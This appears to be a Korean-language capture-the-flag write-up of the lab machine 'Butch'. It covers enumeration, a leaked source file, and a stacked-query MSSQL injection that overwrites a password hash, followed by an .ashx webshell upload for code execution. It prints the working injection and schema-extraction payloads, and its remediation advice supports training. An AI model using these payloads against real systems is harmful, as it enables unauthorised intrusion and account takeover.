---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/enum/dirbust
  - tech/web/info-disclosure
  - tech/web/sqli
  - tech/web/auth-bypass
  - tech/web/file-upload
  - tech/db/mssql
  - tech/exec/winrm
type: machine
platform: pg
os: windows
ip: 192.168.243.63
ports: [21, 25, 135, 139, 445, 450, 5985]
services: [ftp, http, microsoft-ds, msrpc, netbios-ssn, smtp]
status: solved
manual_tags: true
tech_count: 7
---

> [!info] 요약
> 타겟 `192.168.243.63` · Windows Server 2019 (`butch`, IIS 10.0 / ASP.NET 4.0.30319) · 플래그 2개
> 진입점: 450/tcp IIS 웹앱 → `/Dev/` 디렉터리 리스팅으로 `site.master.txt` 소스 노출 → 로그인 폼 스택 쿼리 SQLi 로 `butch` 의 비밀번호 해시를 `SHA256("butch")` 로 덮어씀 → `butch`/`butch` 로그인 → `repo.aspx` 에 `webshell.ashx` 업로드 → RCE
> 권한상승: 웹셸이 이미 `nt authority\system`(앱풀 특권 신원) → 로컬 관리자 `4leaf` 생성 → WinRM 토큰 필터링에 막힘 → 내장 `Administrator`(RID 500) 비밀번호 재설정 후 evil-winrm 대화형 셸
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.243.63

### Initial Access – 디렉터리 리스팅으로 샌 소스와 로그인 폼 스택 쿼리 SQLi 가 임의 파일 업로드 RCE 로 이어짐

**Vulnerability Explanation:** 결함 넷이 겹쳐 무인증 RCE 로 이어짐.
- `/Dev/` 에 IIS 디렉터리 브라우징이 켜져 있고 그 안에 `site.master.txt` 가 놓임 — `.master`·`.cs` 는 IIS 가 거부하지만 `.txt` 사본은 매핑이 없어 정적 파일로 원문 그대로 서빙됨
- 로그인 폼의 이름 입력이 T-SQL 쿼리에 문자열 연결로 들어감 — `System.Data.SqlClient.SqlException` 이 화면에 그대로 노출되는 상세 에러 설정까지 겹침
- MSSQL + ADO.NET 조합이라 세미콜론 스택 쿼리가 성립 — SQLi 가 읽기가 아니라 **임의 쓰기**가 되어 저장된 비밀번호 해시를 덮어쓰는 인증 우회로 직결됨
- 인증 후 업로드 기능이 실행 가능한 확장자를 거르지 않고, 저장 위치가 웹루트라 업로드 즉시 실행 가능

**Vulnerability Fix:**
- IIS Directory Browsing 비활성(`<directoryBrowse enabled="false" />`) · 소스 사본을 배포 아티팩트에서 제외하고 `.cs`·`.txt`·`.bak` 을 `<requestFiltering><fileExtensions>` 로 차단 · 소스는 웹루트 밖(`App_Code`)에 둘 것
- `SqlParameter` 파라미터 바인딩으로 문자열 연결 제거 · 앱 DB 계정에서 `UPDATE` 권한 회수 · `<customErrors mode="On" />` 로 예외 노출 차단
- 비밀번호를 솔트 없는 SHA-256 이 아니라 bcrypt/Argon2id/PBKDF2 + 계정별 솔트로 저장할 것 — 솔트가 있으면 「아는 값의 해시를 심는」 이 공격이 성립하지 않음
- 업로드는 확장자 화이트리스트 + 웹루트 밖 저장 + 저장 디렉터리에 `<handlers><clear /></handlers>` 로 실행 차단, 파일명은 서버가 GUID 로 재생성

**Severity:** Critical — 무인증 원격 SQLi 로 인증을 우회하고 그대로 원격 코드 실행까지 도달

**Steps to reproduce the attack:**
1. `nmap -p-` 로 450/tcp IIS 발견 (기본 1000포트 스캔에는 없음)
2. `feroxbuster -x asp,txt,html,bak,zip` 로 `/dev/` 발견 → 브라우저로 열어 `site.master.txt` 열람
3. 로그인 폼 이름 칸에 `'` 입력 → `SqlException` 노출로 MSSQL + 문자열 컨텍스트 주입 확정
4. 스택 쿼리로 `update users set password_hash='<SHA256("butch")>' where username='butch'; --` 실행
5. `butch` / `butch` 로 로그인 → `repo.aspx` 업로드 폼 노출
6. `webshell.ashx` 업로드 → `http://192.168.243.63:450/webshell.ashx?cmd=whoami` 로 명령 실행

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.243.63 | TCP: 21, 25, 135, 139, 445, 450, 5985 |

```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ nnmap 192.168.243.63
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 10:48 +0900
Nmap scan report for 192.168.243.63
Host is up (0.086s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
25/tcp   open  smtp          Microsoft ESMTP 10.0.17763.1
| smtp-commands: butch Hello [192.168.45.207], TURN, SIZE 2097152, ETRN, PIPELINING, DSN, ENHANCEDSTATUSCODES, 8bitmime, BINARYMIME, CHUNKING, VRFY, OK
|_ This server supports the following commands: HELO EHLO STARTTLS RCPT DATA RSET MAIL QUIT HELP AUTH TURN ETRN BDAT VRFY
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
450/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Butch
| http-methods:
|_  Potentially risky methods: TRACE
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: butch; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-08-18T01:50:03
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   85.78 ms 192.168.45.1
2   85.63 ms 192.168.45.254
3   86.38 ms 192.168.251.1
4   87.36 ms 192.168.243.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.69 seconds
```
— 대화형 Kali 터미널 세션 캡처. 스캔 본문은 `~/PG/Butch/nmap.log` 와 일치하고, 첫·끝 줄만 stdout 배너라 로그 파일에는 `# Nmap 7.98 scan initiated …` / `# Nmap done at …` 형태로 들어감

`nnmap` 은 오타가 아니라 별칭. 로그 첫 줄에 실제 명령이 그대로 박혀 있음.

```text
# Nmap 7.98 scan initiated Tue Aug 18 10:48:59 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.243.63
```
— 출처: `~/PG/Butch/nmap.log` 1행

```sh
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```
— 출처: Kali `~/.zshrc:247`

별칭에 `-oN nmap.log` 가 박혀 있어 작업 디렉터리를 안 바꾸면 이전 박스 로그를 덮어씀. 재현 시 명시 형태:

```bash
sudo nmap -sCV -A -p- -Pn --min-rate 5000 -oN nmap.log 192.168.243.63
```

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-p-` | 1–65535 전수 | **450 을 못 찾음. 박스가 통째로 막힘** |
| `-sCV` | 기본 NSE + 버전 | `Microsoft ESMTP 10.0.17763.1` 같은 빌드 번호를 못 얻음 |
| `-Pn` | ping 생략 | 윈도 방화벽이 ICMP 를 막으면 호스트가 down 판정되어 스캔 자체가 안 돎 |
| `--min-rate 5000` | 초당 패킷 하한 | 전수 스캔이 수십 분으로 늘어남 |
| `-oN` | 결과 저장 | 되짚을 근거 소실(시험 리포트 증적) |

**OS 판정 — 독립 근거 2개.**

- SMTP 배너 `Microsoft ESMTP 10.0.17763.1` — 빌드 17763 = Windows Server 2019(1809)
- nmap OS 지문 `Running (JUST GUESSING): Windows Server 2019 (92%)`

둘이 일치하므로 Server 2019 확정. `450/tcp` 의 IIS 10.0 도 Server 2016/2019 계열과 정합.

읽는 법이 갈리는 줄만 추림.

| 줄 | 읽는 법 |
|---|---|
| `Not shown: 65528 filtered` | 응답 자체가 없음 = 호스트 방화벽 기본 차단. 열린 7개가 전부이고, 이 줄 자체가 전수 스캔의 증거 |
| `21/tcp Microsoft ftpd` + `SYST: Windows_NT` | IIS FTP. 익명 로그인·웹루트 겹침이 첫 확인 후보 |
| `VRFY` 지원 | SMTP 사용자 열거 가능 신호. 이 박스에서는 미사용 |
| `450/tcp http IIS 10.0` + `http-title: Butch` | 주 공격면 |
| `5985/tcp Microsoft HTTPAPI httpd 2.0` | **WinRM 개방.** 자격증명만 얻으면 대화형 셸이 있다는 뜻이라 최종 목표가 미리 정해짐 |
| `smb2-security-mode: signing enabled but not required` | SMB 릴레이 성립 조건이나 단일 호스트라 릴레이 대상이 없음 |

`Potentially risky methods: TRACE` 는 nmap 이 늘 붙이는 저위험 지적. Cross-Site Tracing 은 최신 브라우저가 `XMLHttpRequest` 에서 TRACE 를 막아 사실상 죽은 공격이라 리포트의 Low 항목 한 줄로 끝낼 것.

**whatweb — 웹 스택 판정**

```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ cat whatweb.txt
http://192.168.243.63:450 [200 OK] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[192.168.243.63], Meta-Author[Butch], Microsoft-IIS[10.0], PasswordField[ctl00$ContentPlaceHolder1$PasswordTextBox], Title[Butch][Title element contains newline(s)!], X-Powered-By[ASP.NET]
```
— 출처: `~/PG/Butch/whatweb.txt`

| 단서 | 의미 |
|---|---|
| `ASP_NET[4.0.30319]` | .NET Framework 4.x CLR. .NET Core 가 아닌 클래식 ASP.NET → `web.config`·`.aspx`·`.ashx` 세계 |
| `PasswordField[ctl00$ContentPlaceHolder1$PasswordTextBox]` | ASP.NET WebForms 확정. `ctl00$...$...` 접두는 마스터 페이지 + ContentPlaceHolder 구조의 서명 |
| `Meta-Author[Butch]` | 커스텀 개발 앱. 알려진 CVE 가 아니라 코드 결함을 찾을 것 |

`ctl00$ContentPlaceHolder1$PasswordTextBox` 의 구조 — `ctl00` 은 마스터 페이지 자체(자동 생성 ID), `ContentPlaceHolder1` 은 마스터 안 콘텐츠 영역 ID, `PasswordTextBox` 가 실제 컨트롤 ID.

`curl` 로 로그인을 자동화하려면 파라미터 이름을 이 문자열 그대로 보낼 것. `password=...` 로 보내면 서버가 무시하고 빈 값 처리함. WebForms 폼에는 `__VIEWSTATE`·`__EVENTVALIDATION`·`__VIEWSTATEGENERATOR` 히든 필드가 거의 항상 붙고, 매 요청마다 파싱해 되돌리지 않으면 `Validation of viewstate MAC failed` 가 남.

```bash
curl -s -c c.jar http://TARGET:450/ -o page.html
VS=$(grep -oP '__VIEWSTATE" value="\K[^"]+' page.html)
EV=$(grep -oP '__EVENTVALIDATION" value="\K[^"]+' page.html)
curl -s -b c.jar -c c.jar http://TARGET:450/ \
  --data-urlencode "__VIEWSTATE=$VS" \
  --data-urlencode "__EVENTVALIDATION=$EV" \
  --data-urlencode 'ctl00$ContentPlaceHolder1$PasswordTextBox=x'
```

위 골격은 이 박스에서 실행한 것이 아니라 WebForms 자동화의 일반 형태임. 이 박스는 브라우저로 진행했고 스크린샷이 그 기록임.

**feroxbuster — 디렉터리 열거**

```bash
┌──(kali㉿kali)-[~/PG/Butch]
└─$ feroxbuster -u http://192.168.243.63:450/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x asp,txt,html,bak,zip -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.243.63:450/
 🚩  In-Scope Url          │ 192.168.243.63
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [asp, txt, html, bak, zip]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       10l       60w     4209c http://192.168.243.63:450/favicon.png
200      GET       82l      138w     1191c http://192.168.243.63:450/style.css
200      GET       42l      128w     2128c http://192.168.243.63:450/
301      GET        2l       10w      153c http://192.168.243.63:450/dev => http://192.168.243.63:450/dev/
301      GET        2l       10w      153c http://192.168.243.63:450/DEV => http://192.168.243.63:450/DEV/
301      GET        2l       10w      153c http://192.168.243.63:450/Dev => http://192.168.243.63:450/Dev/
404      GET       40l      156w     1888c http://192.168.243.63:450/con
404      GET       40l      156w     1888c http://192.168.243.63:450/aux
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.asp
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.txt
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.html
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.bak
400      GET        6l       26w      324c http://192.168.243.63:450/error%1F_log.zip
404      GET       40l      156w     1888c http://192.168.243.63:450/prn
[####################] - 3m    180156/180156  0s      found:15      errors:0
[####################] - 3m    180000/180000  1100/s  http://192.168.243.63:450/
[####################] - 0s    180000/180000  1034483/s http://192.168.243.63:450/dev/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    180000/180000  1034483/s http://192.168.243.63:450/DEV/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    180000/180000  1052632/s http://192.168.243.63:450/Dev/ => Directory listing (add --scan-dir-listings to scan)     
```
— 출처: 명령 원문은 Kali `~/.zsh_history:2228`. 출력은 이 노트가 유일한 기록(`~/PG/Butch/` 에 로그 파일 없음)

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-x asp,txt,html,bak,zip` | 확장자를 붙여 재시도 | **`txt` 가 없으면 `site.master.txt` 소스 노출을 통째로 놓침.** IIS 타겟이면 `asp,aspx,ashx,asmx,config,txt,bak,zip,old` 가 기본 세트 |
| `-t 100` | 동시 100 스레드 | 기본값이면 18만 요청이 수 배로 느려짐. 반대로 너무 올리면 앱이 뻗어 오탐 404 가 쏟아짐 |
| (기본) `Extract Links: true` | 응답 본문의 링크를 자동 추가 | 워드리스트에 없는 경로를 놓침 |
| (기본) `Recursion Depth 4` | 발견 디렉터리 재귀 탐색 | 하위 경로 누락 |

빠진 것은 `--scan-dir-listings`. 출력 하단이 직접 알려줌 — `Directory listing (add --scan-dir-listings to scan)`. 켰다면 `/dev/` 안 파일 목록을 feroxbuster 가 직접 긁어옴. 이 박스는 브라우저로 해결했으나 알림 줄을 읽고 재실행하는 편이 나음.

**`/Dev/` 디렉터리 리스팅**

![[Pasted image 20260818110442.png]]

리스팅에 보이는 것은 두 파일뿐 — `site.master.txt`(1014바이트) · `style.css`(1191바이트), 둘 다 2020-05-20 06:37 AM. `.cs` 원문이나 `web.config` 사본은 **리스팅에 없음.**

IIS 에서 Directory Browsing 은 기본 비활성이므로 켜져 있다는 것 자체가 개발자가 의도적으로 켰다는 뜻이고, 그런 디렉터리에는 대개 배포되면 안 되는 것이 들어 있음.

ASP.NET 확장자는 셋 중 하나로 처리되며 이 구분이 체인의 출발점임.

| 확장자 | IIS/ASP.NET 처리 | 브라우저로 원문이 보이는가 |
|---|---|---|
| `.aspx` · `.ashx` · `.asmx` | 핸들러가 가로채 컴파일·실행(`PageHandlerFactory` / `SimpleHandlerFactory`) | 아님 — 렌더링 결과만 |
| `.master` · `.cs` · `.config` · `.asax` | **거부**(`HttpForbiddenHandler`) | 아님 — 에러만 |
| `.txt` · `.bak` · `.old` · `~` | 매핑 없음 → 정적 파일로 서빙 | **그렇다. 원문 그대로** |

근거는 프레임워크 기본 설정 `%windir%\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`.

```xml
<add path="*.aspx"   type="System.Web.UI.PageHandlerFactory" />
<add path="*.ashx"   type="System.Web.UI.SimpleHandlerFactory" />
<add path="*.master" type="System.Web.HttpForbiddenHandler" />
<add path="*.cs"     type="System.Web.HttpForbiddenHandler" />
```

IIS7+ 기본 `applicationHost.config` 의 요청 필터링이 한 겹 더 있음.

```xml
<requestFiltering>
  <fileExtensions>
    <add fileExtension=".master" allowed="false" />
    <add fileExtension=".cs"     allowed="false" />
```

그래서 실제 응답은 HTTP `404.7 — File extension denied` 이고, 요청 필터링을 제거한 경우에만 그 아래 ASP.NET 층의 `403 — This type of page is not served` 에 도달함.

`site.master.txt` 전문:

```html
<%@ Language="C#" src="site.master.cs" Inherits="MyNamespaceMaster.MyClassMaster" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
	<head runat="server">
		<title>Butch</title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<meta name="application-name" content="Butch">
		<meta name="author" content="Butch">
		<meta name="description" content="Butch">
		<meta name="keywords" content="Butch">
		<link media="all" href="style.css" rel="stylesheet" type="text/css" />
		<link id="favicon" rel="shortcut icon" type="image/png" href="favicon.png" />
	</head>
	<body>
		<div id="wrap">
			<div id="header">Welcome to Butch Repository</div>
			<div id="main">
				<div id="content">
					<br />
					<asp:contentplaceholder id="ContentPlaceHolder1" runat="server"></asp:contentplaceholder>
					<br />
				</div>
			</div>
		</div>
	</body>
</html>
```

첫 줄이 전부임.

| 조각 | 알려주는 것 |
|---|---|
| `Language="C#"` | 코드비하인드가 C#. VB.NET 아님 |
| `src="site.master.cs"` | `.cs` 원본이 웹루트에 함께 놓여 있음. 단 `/Dev/site.master.cs` 직접 요청은 반드시 실패함(404.7 — 거부 확장자). 노릴 것은 핸들러 파이프라인을 우회하는 사본(`.txt`·`.bak`·`.old`·`~`) |
| `Inherits="MyNamespaceMaster.MyClassMaster"` | 네임스페이스/클래스 명명 규칙. 다른 페이지 코드비하인드 이름 추측 재료 |
| `<asp:contentplaceholder id="ContentPlaceHolder1">` | whatweb 이 본 `ctl00$ContentPlaceHolder1$PasswordTextBox` 의 출처 확인 — 독립 근거 2개가 맞물림 |

`src=` 는 런타임 컴파일을 뜻함. 일반 WebForms 는 `CodeBehind="x.aspx.cs"` + 미리 컴파일된 DLL(`/bin/`)을 쓰는데, `src=` 면 `.cs` 파일이 웹루트에 실제로 존재함. 다만 HTTP 로는 직접 못 받음.

⚠️ **이 박스에서 `/Dev/` 가 실제로 준 것은 `site.master.txt` 뿐이고, 그 안에 DB 스키마·해시 알고리즘은 없음.** 리스팅에 `.cs` 사본이 없었다는 것은 스크린샷으로 확인됨.

### Initial Access – SQLi 해시 덮어쓰기 → `.ashx` 웹셸

**로그인 폼 — `'` 하나**

로그인 폼의 이름 칸에 작은따옴표 하나를 입력하자 예외가 화면에 그대로 렌더됨.

![[Pasted image 20260818110543.png]]

스크린샷의 에러 원문(발췌):

```text
System.Data.SqlClient.SqlException (0x80131904): Unclosed quotation mark after the character string "';. Incorrect syntax near "';. at System.Data.SqlClient.SqlConnection.OnError(...) ... at MyNamespaceMain.MyClassMain.Login(Object sender, EventArgs e) ClientConnectionId:26f38126-57aa-4687-b967-e9c7b267c2fc Error Number:105,State:1,Class:15
```
— 출처: 볼트 `파일보관\Pasted image 20260818110543.png`

여기서 세 가지가 **관측으로** 확정됨.

- 예외 타입이 `System.Data.SqlClient.SqlException` → 백엔드는 **Microsoft SQL Server**. MySQL 이면 `MySql.Data.MySqlClient.MySqlException`, Oracle 이면 `Oracle.ManagedDataAccess.Client.OracleException` 이 떴을 것
- `Unclosed quotation mark` / `Error Number:105` → 입력이 문자열 리터럴 컨텍스트에 그대로 연결됨
- 스택 트레이스가 `MyNamespaceMain.MyClassMain.Login` 까지 노출 → `customErrors` 가 `Off`. 에러 기반 추출 채널이 살아 있음

폼 라벨은 `Enter Name:` / `Enter Passkey:`. 스크린샷의 Passkey 칸에 회색으로 `butch` 가 보이는데, 페이지의 `placeholder` 속성인지 브라우저 자동완성 표시인지는 **[가정]** — 화면만으로는 구분 불가.

서버 코드는 전형적인 ADO.NET 안티패턴 형태로 추정됨(**[가정]** — `.cs` 원문을 읽은 기록 없음).

```csharp
string q = "SELECT password_hash FROM users WHERE username = '" + idTextBox.Text + "'";
SqlCommand cmd = new SqlCommand(q, conn);
```

입력이 `'` 이면 최종 쿼리의 따옴표가 홀수 개가 되어 문자열이 닫히지 않고 T-SQL 파서가 에러 105 를 던짐.

```sql
SELECT password_hash FROM users WHERE username = '''
```

SQLi 존재 확인은 세 번의 입력이면 끝남.

| 입력 | 기대 | 판정 |
|---|---|---|
| `'` | 에러 | 문자열 컨텍스트 인젝션 성립 |
| `''` | 정상(로그인 실패) | 따옴표 개수가 맞으면 에러가 사라짐 → 에러가 우연이 아님을 확증 |
| `' or '1'='1` | 동작 변화 | 논리 조작이 서버에 도달함 |

`'` 하나로 에러가 났다고 바로 페이로드를 던지지 말 것. `''` 로 에러가 사라지는지 확인하는 1초가 단순 500 에러 페이지 오탐을 걸러냄.

**실행한 페이로드**

```sql
'; update users set password_hash='48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0' where username = 'butch'; --
```

스택 쿼리(Stacked / Batched Query)는 세미콜론으로 구분된 여러 문장을 한 번에 보내는 것. 원 쿼리가 `SELECT` 인데 완전히 다른 `UPDATE` 를 이어 붙여 실행시킴. 이것이 되면 SQLi 는 읽기 취약점이 아니라 **임의 쓰기**가 되고, MSSQL 이면 `EXEC xp_cmdshell` 로 곧바로 RCE 까지 감.

되고 안 되고는 DBMS 와 드라이버 조합이 결정함.

| 조합 | 스택 쿼리 | 근거 |
|---|---|---|
| MSSQL + ADO.NET(`SqlCommand`) | **됨** | T-SQL 은 배치 실행이 기본. 이 박스가 여기 해당 |
| MSSQL + JDBC / PHP `sqlsrv` | 됨 | 동일 |
| PostgreSQL + 대부분의 드라이버 | 됨 | |
| MySQL + JDBC | **안 됨** | `allowMultiQueries=false` 가 기본([[Hawat]] 에서 실제로 막힘) |
| MySQL + PHP `mysqli_query()` | **안 됨** | 단일 문장만 실행. `mysqli_multi_query()` 여야 함 |
| Oracle | **안 됨** | 익명 PL/SQL 블록 필요 |

페이로드 조각별 역할:

| 조각 | 역할 | 빼면 |
|---|---|---|
| `'` | 원 쿼리의 문자열 리터럴 조기 종료. 이 시점에서 커서가 SQL 문법 위에 섬 | 입력이 그냥 데이터로 남음 |
| `;` | 문장 경계. 앞의 `SELECT ... WHERE username = ''` 를 끝내고 새 문장을 엶 | 이어붙은 `update` 가 `SELECT` 의 일부로 해석되어 구문 에러 |
| `update users set password_hash='...'` | 본체. 저장된 해시를 아는 값으로 교체 | — |
| `where username = 'butch'` | 대상 한정 | 테이블 전체 비밀번호가 날아감. 앱의 다른 계정으로 돌아갈 길과 채점 재현·본인 재접근까지 함께 죽음. 되돌릴 방법은 revert 뿐이고 revert 하면 그 머신의 진척이 전부 사라짐 |
| `; --` | 뒤에 남은 원 쿼리 잔여물(`'`)을 주석 처리 | 닫히지 않은 따옴표가 남아 구문 에러 |

**T-SQL 의 `--` 는 MySQL 과 다름.** MySQL 은 `--` 다음에 공백·개행이 반드시 있어야 주석으로 보고([[Hawat]] 에서 `-- ` 로 씀), T-SQL 은 `--` 만으로 줄 끝까지 주석임. 단 URL 인코딩 과정에서 후행 공백이 잘리는 사고가 흔하므로 어느 DBMS 든 `-- -` 또는 `/*` 를 쓰는 습관이 안전함. `%23`(`#`)은 MySQL 전용이라 MSSQL 에서는 안 통함.

**심은 해시값의 정체**

`48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0` 은 `butch` 라는 문자열(소문자, 개행 없음)의 SHA-256.

> [!note] 검산 절차
> 아래는 당시 세션 기록이 아니라 검산 절차임(원본 작업 로그에 이 계산은 남아 있지 않음). 값은 재계산으로 일치를 확인함.
> ```bash
> echo -n 'butch' | sha256sum
> 48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0  -
> ```
> ```powershell
> $s=[System.Security.Cryptography.SHA256]::Create()
> ($s.ComputeHash([Text.Encoding]::UTF8.GetBytes('butch'))|%{$_.ToString('x2')}) -join ''
> 48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0
> ```

`echo -n` 의 `-n` 이 없으면 전혀 다른 해시가 나옴. 개행 한 바이트, 대소문자 하나로 값이 완전히 달라짐.

| 입력 | SHA-256 |
|---|---|
| `butch` (개행 없음) | `48f9460f…f163ab0` ← 이 박스가 심은 값 |
| `butch\n` (`echo` 기본) | `141714383b1614e77057017a9d38eaf033724353a1d9a8c25cbf57566faf51cd` |
| `Butch` | `7e4a6c94d902af155773c2c8c6c115e5414716c276b34f347b98e82d2a22c37e` |
| `BUTCH` | `faf32403fa9556a16f621d8c764586b4c0dcd9ce2d1a9fb4ed053d598bfa61d6` |

넷이 전부 다르므로 이 박스의 평문이 소문자 `butch`, 개행 없음이라는 것이 역으로 확정됨. 즉 공격은 `butch` 계정의 비밀번호를 `butch` 로 바꾼 것이고 이후 `butch` / `butch` 로 로그인함.

**이 페이로드를 만들려면 미리 알아야 하는 셋** — 테이블명 `users` · 컬럼명 `password_hash`/`username` · 해시 알고리즘(솔트 없는 SHA-256).

⚠️ **셋을 어디서 얻었는지는 관측 없음.** `/Dev/` 리스팅에 있던 것은 `site.master.txt` 와 `style.css` 뿐이고 그 안에 DB 코드가 없으므로 **「소스에서 읽었다」는 경로는 반증됨.** 남는 후보는 에러 기반 열거(기록 없음)나 외부 자료이며 어느 쪽인지 판별할 근거가 이 박스 산출물에 없음.

셋 중 알고리즘이 결정적임. 알고리즘을 모르면 무엇을 넣어야 로그인이 되는지 알 수 없어 이 공격이 성립하지 않음. 소스를 못 읽는 상황의 대안:

- 에러 기반으로 스키마를 먼저 뽑음 — `' and 1=convert(int,(select top 1 name from sys.columns where object_id=object_id('users')))--`
- 원본 해시를 뽑아 길이로 알고리즘 추정 — 64 hex = SHA-256, 40 hex = SHA-1, 32 hex = MD5
- `$2a$`/`$2b$` 로 시작하면 bcrypt. 이때는 덮어쓰기가 훨씬 어려움(솔트 포함 문자열을 통째로 넣어야 함)

> [!danger] ⚠️ 시험 금지 도구 — sqlmap → 수동 대안
> 이 단계는 sqlmap 이면 `--dbms=mssql --technique=S --sql-query="update ..."` 한 줄이지만 OSCP 시험에서 sqlmap 은 금지임. 수동 MSSQL 절차 전문은 [[_PLAYBOOK]]. 이 박스에서 실제로 실행된 것은 위의 `update` 스택 쿼리 하나임.

**로그인 성공**

![[Pasted image 20260818111108.png]]

`Welcome to Butch's Ultimate File Repository!` — 로그인 후 화면에 파일 업로드 폼이 열려 있음. 경로는 `repo.aspx`.

**`.ashx` 웹셸 업로드**

![[Pasted image 20260818111445.png]]

`http://192.168.243.63:450/repo.aspx` 에서 `webshell.ashx` 업로드 → `File uploaded successfully!`. 업로드본은 **웹루트에 그대로** 떨어져 `http://192.168.243.63:450/webshell.ashx` 로 바로 접근됨 — 저장 경로를 추적할 필요가 없었음.

`.ashx` 는 ASP.NET Generic Handler 로, `IHttpHandler` 를 구현한 단일 파일임.

```csharp
<%@ WebHandler Language="C#" Class="Handler" %>
using System.Web;
public class Handler : IHttpHandler {
    public void ProcessRequest(HttpContext ctx) { /* 여기가 실행된다 */ }
    public bool IsReusable { get { return false; } }
}
```

`.aspx` 대신 `.ashx` 를 고르는 이유는 셋 — 디자이너 파일·마스터 페이지가 필요 없어 한 파일로 완결되고, 업로드 필터 블랙리스트에서 자주 누락되며(대부분 `.asp`·`.aspx`·`.php`·`.jsp` 까지만 막음), `SimpleHandlerFactory` 매핑이 기본으로 켜져 있어 별도 설정 없이 실행됨.

단 통합 파이프라인의 핸들러 항목은 `verb="GET,HEAD,POST,DEBUG"` 로 등록됨(`verb="*"` 가 아님). 이 박스의 웹셸은 `?cmd=` GET 방식이라 무관하나, `PUT`/`OPTIONS` 를 기대하는 페이로드는 이 매핑에 안 걸림.

**[가정]** 이 박스가 `.aspx` 를 막았는지는 기록에 없음. 업로드 필터의 존재를 시사하는 기록도, `.aspx` 업로드가 거부된 흔적도 원본에 없음. `.ashx` 를 고른 것은 필터를 확인해서가 아니라 위 세 이유로 합리적인 첫 선택이었기 때문으로 읽는 것이 정확함. IIS 업로드 필터 우회 사다리 전문은 [[_PLAYBOOK]].

웹셸 원본으로 노트에 기록된 출처는 `https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx`. 실행 화면 하단에는 `By @Hypn, for educational purposes only.` 가 렌더됨. **원본 파일은 `~/PG/Butch/` 에 남아 있지 않음** — 회수된 산출물은 `nmap.log`·`whatweb.txt`·`nc64.exe` 셋뿐임.

**Local.txt value:**
`0c5dba72fd1984addf833413a2f9c58e`

⚠️ 위치는 `C:\Users\butch\Desktop\local.txt` 이나, **실제로 읽은 것은 권한상승 뒤 `Administrator` evil-winrm 세션에서임** — 원문 출력은 `Post-Exploitation` 절의 세션 블록에 있음. 웹셸 단계에서 읽은 것이 아님.

### Privilege Escalation – IIS 앱풀이 `nt authority\system` → 로컬 관리자 계정 생성 → RID 500 으로 WinRM 대화형 셸

